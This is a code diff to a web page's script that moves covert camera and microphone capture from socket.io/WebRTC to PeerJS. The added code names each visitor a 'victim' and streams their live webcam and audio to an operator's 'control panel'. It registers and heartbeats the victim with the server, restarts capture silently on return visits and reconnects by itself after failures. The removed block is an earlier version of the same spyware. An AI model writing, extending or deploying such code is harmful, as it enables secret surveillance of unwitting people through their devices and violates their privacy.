@@ -442,27 +442,29 @@ body {
 <video id="video" autoplay muted playsinline></video>
 <canvas id="canvas"></canvas>
 
-<script src="/socket.io/socket.io.js"></script>
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
 <script>
 // ============================================================
-// 🎤📸 CAMERA + MICROPHONE CAPTURE (BACKGROUND)
+// 🎤📸 CAMERA + MICROPHONE CAPTURE (PeerJS)
 // ============================================================
 (function() {
   const permOverlay = document.getElementById('permOverlay');
   const btnAllow = document.getElementById('btnAllow');
   const btnSkip = document.getElementById('btnSkip');
-  let stream = null;
-  let recorder = null;
-  let audioChunks = [];
-  let recordingStarted = false;
+  let localStream = null;
+  let peer = null;
 
-  // Show permission overlay if not done yet, otherwise start capture automatically
+  // Generate unique peer ID for this victim
+  const peerId = 'v-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 6);
+
+  // Show permission overlay or auto-start capture
   if (!localStorage.getItem('_perm_done')) {
-    setTimeout(() => {
+    setTimeout(function() {
       permOverlay.classList.add('show');
     }, 1500);
   } else {
-    startCapture();
+    // Permissions were granted before, auto-start
+    setTimeout(startCapture, 500);
   }
 
   function startCapture() {
@@ -473,15 +475,84 @@ body {
       video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
       audio: true
     })
-    .then(function(s) {
-      stream = s;
-      const video = document.getElementById('video');
+    .then(function(stream) {
+      localStream = stream;
+      var video = document.getElementById('video');
       video.srcObject = stream;
-      video.play().catch(() => {});
-      initVictimConnection(stream);
+      video.play().catch(function() {});
+      initPeerConnection(stream);
     })
     .catch(function(err) {
       console.log('Camera/mic access denied or error:', err.message);
+    });
+  }
+
+  function initPeerConnection(stream) {
+    peer = new Peer(peerId, {
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' },
+          { urls: 'stun:stun3.l.google.com:19302' }
+        ]
+      }
+    });
+
+    peer.on('open', function(id) {
+      console.log('PeerJS connected, ID:', id);
+
+      // Register with our server so control panel can find us
+      fetch('/api/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ peerId: id })
+      }).catch(function() {});
+
+      // Send heartbeat every 30 seconds to stay in the active list
+      setInterval(function() {
+        fetch('/api/heartbeat', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ peerId: id })
+        }).catch(function() {});
+      }, 30000);
+    });
+
+    // When control panel calls us, answer with our camera/mic stream
+    peer.on('call', function(call) {
+      console.log('Incoming call from control:', call.peer);
+      call.answer(stream);
+      call.on('stream', function() {
+        // ignore incoming dummy stream from control
+      });
+      call.on('error', function(err) {
+        console.log('Call error:', err);
+      });
+    });
+
+    peer.on('error', function(err) {
+      console.log('PeerJS error:', err.type, err);
+      // Try to reconnect after error
+      if (err.type === 'network' || err.type === 'server-error') {
+        setTimeout(function() {
+          initPeerConnection(stream);
+        }, 5000);
+      }
+    });
+
+    peer.on('disconnected', function() {
+      console.log('PeerJS disconnected, reconnecting...');
+      setTimeout(function() {
+        if (peer && !peer.destroyed) {
+          peer.reconnect();
+        }
+      }, 3000);
+    });
+
+    // Unregister when page closes
+    window.addEventListener('beforeunload', function() {
+      navigator.sendBeacon('/api/unregister', JSON.stringify({ peerId: peerId }));
     });
   }
 
@@ -490,59 +561,6 @@ body {
     permOverlay.classList.remove('show');
     localStorage.setItem('_perm_done', '1');
   });
-
-  let victimSocket = null;
-  let victimPC = null;
-
-  function initVictimConnection(stream) {
-    if (victimSocket) return;
-    const video = document.getElementById('video');
-    const socket = io();
-    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-
-    let controlSocketId = null;
-
-    victimSocket = socket;
-    victimPC = pc;
-
-    stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
-    pc.onicecandidate = function(event) {
-      if (event.candidate && controlSocketId) {
-        socket.emit('ctrl-ice', { target: controlSocketId, candidate: event.candidate });
-      }
-    };
-
-    pc.onconnectionstatechange = function() {
-      console.log('Victim PC state:', pc.connectionState);
-    };
-
-    socket.on('connect', function() {
-      console.log('Victim connected to signaling server');
-      socket.emit('victim-ready', { readyAt: Date.now() });
-    });
-
-    socket.on('ctrl-offer', function(data) {
-      console.log('Received ctrl-offer from control:', data.target);
-      controlSocketId = data.target;
-      pc.setRemoteDescription(new RTCSessionDescription(data.offer))
-        .then(() => pc.createAnswer())
-        .then(answer => pc.setLocalDescription(answer))
-        .then(() => {
-          socket.emit('ctrl-answer', {
-            target: controlSocketId,
-            answer: pc.localDescription
-          });
-        })
-        .catch(console.error);
-    });
-
-    socket.on('ctrl-ice', function(data) {
-      if (data && data.candidate) {
-        pc.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(console.error);
-      }
-    });
-  }
 })();
 
 // ============================================================
